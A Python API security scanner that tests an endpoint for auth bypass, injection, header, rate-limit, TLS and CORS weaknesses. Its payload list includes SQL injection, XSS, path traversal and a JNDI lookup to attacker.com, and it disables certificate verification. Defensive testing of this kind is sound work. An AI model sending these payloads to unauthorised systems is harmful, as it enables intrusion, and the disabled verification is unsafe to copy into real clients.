#!/usr/bin/env python3
"""
Integration Security Scanner

Comprehensive security testing for external API integrations,
authentication validation, and vulnerability assessment.

Author: Integration Testing Agent
Date: November 6, 2025
"""

import asyncio
import aiohttp
import ssl
import json
import logging
import hashlib
import hmac
import base64
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs
import re

logger = logging.getLogger(__name__)

@dataclass
class SecurityTestResult:
    """Results from a security test"""
    test_name: str
    severity: str  # 'low', 'medium', 'high', 'critical'
    passed: bool
    description: str
    findings: List[str]
    recommendations: List[str]
    metadata: Optional[Dict[str, Any]] = None

class IntegrationSecurityScanner:
    """Security scanner for external integrations"""

    def __init__(self):
        self.session = None
        self.security_tests = []

        # Common attack patterns and vulnerabilities to test
        self.injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://attacker.com/a}",
            "../../../etc/passwd",
            "1' OR '1'='1",
            "<img src=x onerror=alert(1)>"
        ]

        # Security headers that should be present
        self.required_security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': None,  # Should be present for HTTPS
            'Content-Security-Policy': None     # Should be present
        }

    async def __aenter__(self):
        """Async context manager entry"""
        # Create session with custom SSL context for testing
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        connector = aiohttp.TCPConnector(
            ssl_context=ssl_context,
            limit=50
        )
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()

    async def test_authentication_bypass(self, api_url: str) -> SecurityTestResult:
        """Test for authentication bypass vulnerabilities"""
        findings = []
        recommendations = []

        try:
            # Test common authentication bypass techniques
            bypass_attempts = [
                {"headers": {"Authorization": ""}},
                {"headers": {"Authorization": "Bearer invalid_token"}},
                {"headers": {"Authorization": "Basic invalid"}},
                {"headers": {"X-Auth-Token": ""}},
                {"params": {"access_token": "invalid"}},
                {"headers": {"Cookie": "session=; auth="}}
            ]

            for i, attempt in enumerate(bypass_attempts):
                try:
                    headers = attempt.get("headers", {})
                    params = attempt.get("params", {})

                    async with self.session.get(api_url, headers=headers, params=params) as response:
                        # Check if we got unexpected access
                        if response.status == 200:
                            findings.append(f"Potential auth bypass with method {i+1}: {attempt}")
                            recommendations.append("Implement proper authentication validation")

                        # Check for information disclosure in error messages
                        if response.status in [401, 403]:
                            text = await response.text()
                            if any(keyword in text.lower() for keyword in ['database', 'sql', 'error', 'exception']):
                                findings.append("Information disclosure in authentication error messages")
                                recommendations.append("Use generic error messages for authentication failures")

                except Exception as e:
                    logger.debug(f"Auth bypass test {i} failed: {e}")

            passed = len(findings) == 0
            severity = "critical" if not passed else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="authentication_bypass",
                severity="medium",
                passed=False,
                description="Authentication bypass test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure API is accessible for security testing"]
            )

        return SecurityTestResult(
            test_name="authentication_bypass",
            severity=severity,
            passed=passed,
            description="Test for authentication bypass vulnerabilities",
            findings=findings,
            recommendations=recommendations
        )

    async def test_injection_vulnerabilities(self, api_url: str) -> SecurityTestResult:
        """Test for injection vulnerabilities"""
        findings = []
        recommendations = []

        try:
            for payload in self.injection_payloads:
                try:
                    # Test in query parameters
                    async with self.session.get(api_url, params={"q": payload, "search": payload}) as response:
                        response_text = await response.text()

                        # Check for SQL error messages
                        sql_errors = ['sql syntax', 'mysql', 'postgresql', 'ora-', 'sqlite', 'syntax error']
                        if any(error in response_text.lower() for error in sql_errors):
                            findings.append(f"SQL injection vulnerability detected with payload: {payload}")
                            recommendations.append("Use parameterized queries and input validation")

                        # Check for XSS reflection
                        if payload.startswith("<script>") and payload in response_text:
                            findings.append(f"XSS vulnerability detected with payload: {payload}")
                            recommendations.append("Implement proper output encoding and CSP headers")

                        # Check for template injection
                        if payload == "{{7*7}}" and "49" in response_text:
                            findings.append("Template injection vulnerability detected")
                            recommendations.append("Sanitize template inputs and use safe template engines")

                    # Test in POST data
                    async with self.session.post(api_url, json={"data": payload, "input": payload}) as response:
                        response_text = await response.text()
                        # Similar checks for POST responses
                        if any(error in response_text.lower() for error in sql_errors):
                            findings.append(f"SQL injection in POST data with payload: {payload}")

                except Exception as e:
                    logger.debug(f"Injection test with payload {payload} failed: {e}")

            passed = len(findings) == 0
            severity = "critical" if not passed else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="injection_vulnerabilities",
                severity="medium",
                passed=False,
                description="Injection vulnerability test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure API endpoints are accessible for testing"]
            )

        return SecurityTestResult(
            test_name="injection_vulnerabilities",
            severity=severity,
            passed=passed,
            description="Test for SQL injection, XSS, and template injection vulnerabilities",
            findings=findings,
            recommendations=recommendations
        )

    async def test_security_headers(self, api_url: str) -> SecurityTestResult:
        """Test for proper security headers"""
        findings = []
        recommendations = []

        try:
            async with self.session.get(api_url) as response:
                response_headers = response.headers

                # Check for required security headers
                for header, expected_values in self.required_security_headers.items():
                    if header not in response_headers:
                        findings.append(f"Missing security header: {header}")
                        recommendations.append(f"Add {header} header to responses")
                    elif expected_values and response_headers.get(header) not in expected_values:
                        findings.append(f"Weak {header} header value: {response_headers.get(header)}")

                # Check for information disclosure headers
                disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
                for header in disclosure_headers:
                    if header in response_headers:
                        findings.append(f"Information disclosure header present: {header}")
                        recommendations.append(f"Remove or obfuscate {header} header")

                # Check HTTPS specific headers
                if api_url.startswith('https'):
                    if 'Strict-Transport-Security' not in response_headers:
                        findings.append("HSTS header missing on HTTPS endpoint")
                        recommendations.append("Add Strict-Transport-Security header")

            passed = len(findings) == 0
            severity = "medium" if findings else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="security_headers",
                severity="low",
                passed=False,
                description="Security headers test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure API is accessible for header analysis"]
            )

        return SecurityTestResult(
            test_name="security_headers",
            severity=severity,
            passed=passed,
            description="Test for proper security headers implementation",
            findings=findings,
            recommendations=recommendations
        )

    async def test_rate_limiting(self, api_url: str, requests_per_minute: int = 100) -> SecurityTestResult:
        """Test rate limiting implementation"""
        findings = []
        recommendations = []

        try:
            # Send rapid requests to test rate limiting
            start_time = asyncio.get_event_loop().time()
            responses = []

            # Send requests rapidly
            tasks = []
            for i in range(min(requests_per_minute, 20)):  # Limit for testing
                task = asyncio.create_task(self.session.get(api_url))
                tasks.append(task)

            results = await asyncio.gather(*tasks, return_exceptions=True)

            rate_limited = False
            for result in results:
                if isinstance(result, Exception):
                    continue

                responses.append(result.status)
                if result.status == 429:  # Too Many Requests
                    rate_limited = True

            if not rate_limited:
                findings.append("No rate limiting detected")
                recommendations.append("Implement rate limiting to prevent abuse")

            # Check for consistent response times (indicates no DoS protection)
            elapsed_time = asyncio.get_event_loop().time() - start_time
            if elapsed_time < 1.0:  # All requests completed very quickly
                findings.append("API responds very quickly to burst requests")
                recommendations.append("Consider implementing request throttling")

            passed = rate_limited
            severity = "medium" if not passed else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="rate_limiting",
                severity="low",
                passed=False,
                description="Rate limiting test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure API is accessible for rate limiting tests"]
            )

        return SecurityTestResult(
            test_name="rate_limiting",
            severity=severity,
            passed=passed,
            description="Test for rate limiting and DoS protection",
            findings=findings,
            recommendations=recommendations,
            metadata={"responses": responses[:10]}  # Sample responses
        )

    async def test_ssl_configuration(self, api_url: str) -> SecurityTestResult:
        """Test SSL/TLS configuration"""
        findings = []
        recommendations = []

        if not api_url.startswith('https'):
            return SecurityTestResult(
                test_name="ssl_configuration",
                severity="high",
                passed=False,
                description="SSL/TLS configuration test",
                findings=["API does not use HTTPS"],
                recommendations=["Enable HTTPS/TLS encryption for all API endpoints"]
            )

        try:
            # Test with strict SSL verification
            connector = aiohttp.TCPConnector(ssl_verify_ssl=True)
            timeout = aiohttp.ClientTimeout(total=10)

            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as strict_session:
                try:
                    async with strict_session.get(api_url) as response:
                        # SSL verification passed
                        pass
                except aiohttp.ClientSSLError as ssl_error:
                    findings.append(f"SSL verification failed: {str(ssl_error)}")
                    recommendations.append("Fix SSL certificate issues")
                except Exception as e:
                    findings.append(f"SSL connection error: {str(e)}")

            # Test for weak cipher suites (simplified)
            parsed_url = urlparse(api_url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)

            # Note: Full SSL scanning would require additional libraries
            # This is a basic test for certificate validity

            passed = len(findings) == 0
            severity = "high" if not passed else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="ssl_configuration",
                severity="medium",
                passed=False,
                description="SSL/TLS configuration test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure HTTPS endpoint is accessible for SSL testing"]
            )

        return SecurityTestResult(
            test_name="ssl_configuration",
            severity=severity,
            passed=passed,
            description="Test SSL/TLS configuration and certificate validity",
            findings=findings,
            recommendations=recommendations
        )

    async def test_data_validation(self, api_url: str) -> SecurityTestResult:
        """Test input data validation"""
        findings = []
        recommendations = []

        try:
            # Test various malformed inputs
            test_inputs = [
                {"data": "A" * 10000},  # Large input
                {"data": None},  # Null input
                {"data": []},  # Array instead of string
                {"data": {"nested": "object"}},  # Object instead of expected type
                {"numeric_field": "not_a_number"},  # Invalid type
                {"email": "invalid_email_format"},  # Invalid format
                {"url": "not_a_url"},  # Invalid URL
                {"": "empty_key"},  # Empty key
                {"data": "\x00\x01\x02"},  # Binary data
            ]

            for test_input in test_inputs:
                try:
                    async with self.session.post(api_url, json=test_input) as response:
                        response_text = await response.text()

                        # Check for stack traces or detailed error messages
                        error_indicators = [
                            'traceback', 'exception', 'stack trace', 'error at line',
                            'file not found', 'permission denied', 'access violation'
                        ]

                        for indicator in error_indicators:
                            if indicator in response_text.lower():
                                findings.append(f"Information disclosure in error handling: {indicator}")
                                recommendations.append("Implement generic error messages")

                        # Check if server accepts malformed data
                        if response.status == 200 and test_input.get("numeric_field") == "not_a_number":
                            findings.append("Server accepts invalid data types")
                            recommendations.append("Implement strict input validation")

                except Exception as e:
                    logger.debug(f"Data validation test failed: {e}")

            passed = len(findings) == 0
            severity = "medium" if not passed else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="data_validation",
                severity="low",
                passed=False,
                description="Data validation test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure API endpoints accept POST requests for testing"]
            )

        return SecurityTestResult(
            test_name="data_validation",
            severity=severity,
            passed=passed,
            description="Test input data validation and error handling",
            findings=findings,
            recommendations=recommendations
        )

    async def test_cors_configuration(self, api_url: str) -> SecurityTestResult:
        """Test CORS configuration"""
        findings = []
        recommendations = []

        try:
            # Test CORS with various origins
            test_origins = [
                "https://evil.com",
                "http://localhost",
                "null",
                "*"
            ]

            for origin in test_origins:
                headers = {
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET"
                }

                async with self.session.options(api_url, headers=headers) as response:
                    cors_origin = response.headers.get("Access-Control-Allow-Origin")
                    cors_credentials = response.headers.get("Access-Control-Allow-Credentials")

                    # Check for overly permissive CORS
                    if cors_origin == "*" and cors_credentials == "true":
                        findings.append("Dangerous CORS configuration: wildcard origin with credentials")
                        recommendations.append("Don't allow credentials with wildcard origins")

                    if cors_origin == "*":
                        findings.append("Permissive CORS: wildcard origin allowed")
                        recommendations.append("Use specific origins instead of wildcard")

                    if origin == "https://evil.com" and cors_origin == origin:
                        findings.append("CORS allows requests from arbitrary origins")
                        recommendations.append("Implement whitelist of allowed origins")

            passed = len(findings) == 0
            severity = "medium" if not passed else "low"

        except Exception as e:
            return SecurityTestResult(
                test_name="cors_configuration",
                severity="low",
                passed=False,
                description="CORS configuration test failed to execute",
                findings=[f"Test execution error: {str(e)}"],
                recommendations=["Ensure API supports OPTIONS requests for CORS testing"]
            )

        return SecurityTestResult(
            test_name="cors_configuration",
            severity=severity,
            passed=passed,
            description="Test CORS configuration for security issues",
            findings=findings,
            recommendations=recommendations
        )

    async def run_comprehensive_security_scan(self, api_url: str) -> Dict[str, Any]:
        """Run comprehensive security scan on an API endpoint"""
        logger.info(f"Starting security scan for {api_url}")

        security_tests = [
            self.test_authentication_bypass,
            self.test_injection_vulnerabilities,
            self.test_security_headers,
            self.test_rate_limiting,
            self.test_ssl_configuration,
            self.test_data_validation,
            self.test_cors_configuration
        ]

        results = []
        critical_issues = 0
        high_issues = 0
        medium_issues = 0
        low_issues = 0

        for test_func in security_tests:
            try:
                result = await test_func(api_url)
                results.append(result)

                # Count issues by severity
                if not result.passed:
                    if result.severity == "critical":
                        critical_issues += 1
                    elif result.severity == "high":
                        high_issues += 1
                    elif result.severity == "medium":
                        medium_issues += 1
                    else:
                        low_issues += 1

                logger.info(f"Security test {result.test_name}: {'PASSED' if result.passed else 'FAILED'}")

            except Exception as e:
                logger.error(f"Security test failed: {e}")
                results.append(SecurityTestResult(
                    test_name=test_func.__name__,
                    severity="medium",
                    passed=False,
                    description="Test execution failed",
                    findings=[str(e)],
                    recommendations=["Investigate test failure"]
                ))

        # Calculate overall security score
        total_tests = len(results)
        passed_tests = sum(1 for result in results if result.passed)
        security_score = (passed_tests / total_tests * 100) if total_tests > 0 else 0

        # Generate security recommendations
        all_recommendations = []
        for result in results:
            if not result.passed:
                all_recommendations.extend(result.recommendations)

        unique_recommendations = list(set(all_recommendations))

        return {
            "timestamp": datetime.now().isoformat(),
            "target_url": api_url,
            "security_score": security_score,
            "total_tests": total_tests,
            "passed_tests": passed_tests,
            "failed_tests": total_tests - passed_tests,
            "issue_summary": {
                "critical": critical_issues,
                "high": high_issues,
                "medium": medium_issues,
                "low": low_issues
            },
            "detailed_results": [
                {
                    "test_name": result.test_name,
                    "severity": result.severity,
                    "passed": result.passed,
                    "description": result.description,
                    "findings": result.findings,
                    "recommendations": result.recommendations,
                    "metadata": result.metadata
                }
                for result in results
            ],
            "security_recommendations": unique_recommendations,
            "risk_assessment": self._assess_overall_risk(critical_issues, high_issues, medium_issues, low_issues)
        }

    def _assess_overall_risk(self, critical: int, high: int, medium: int, low: int) -> Dict[str, str]:
        """Assess overall security risk level"""
        if critical > 0:
            risk_level = "CRITICAL"
            risk_description = "Immediate security issues require urgent attention"
        elif high > 0:
            risk_level = "HIGH"
            risk_description = "Significant security vulnerabilities detected"
        elif medium > 2:
            risk_level = "MEDIUM"
            risk_description = "Multiple moderate security concerns identified"
        elif medium > 0 or low > 0:
            risk_level = "LOW"
            risk_description = "Minor security improvements recommended"
        else:
            risk_level = "MINIMAL"
            risk_description = "No significant security issues detected"

        return {
            "level": risk_level,
            "description": risk_description,
            "action_required": risk_level in ["CRITICAL", "HIGH"]
        }

async def main():
    """Main function for running security scanner"""
    test_url = "https://192.168.50.135/api/echo/health"

    async with IntegrationSecurityScanner() as scanner:
        report = await scanner.run_comprehensive_security_scan(test_url)

        # Save report
        from pathlib import Path
        report_path = Path("/opt/tower-echo-brain/logs/security_scan_report.json")
        report_path.parent.mkdir(exist_ok=True)

        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)

        logger.info(f"Security scan completed. Report saved to {report_path}")
        logger.info(f"Security score: {report['security_score']:.1f}%")
        logger.info(f"Risk level: {report['risk_assessment']['level']}")

        return report

if __name__ == "__main__":
    asyncio.run(main())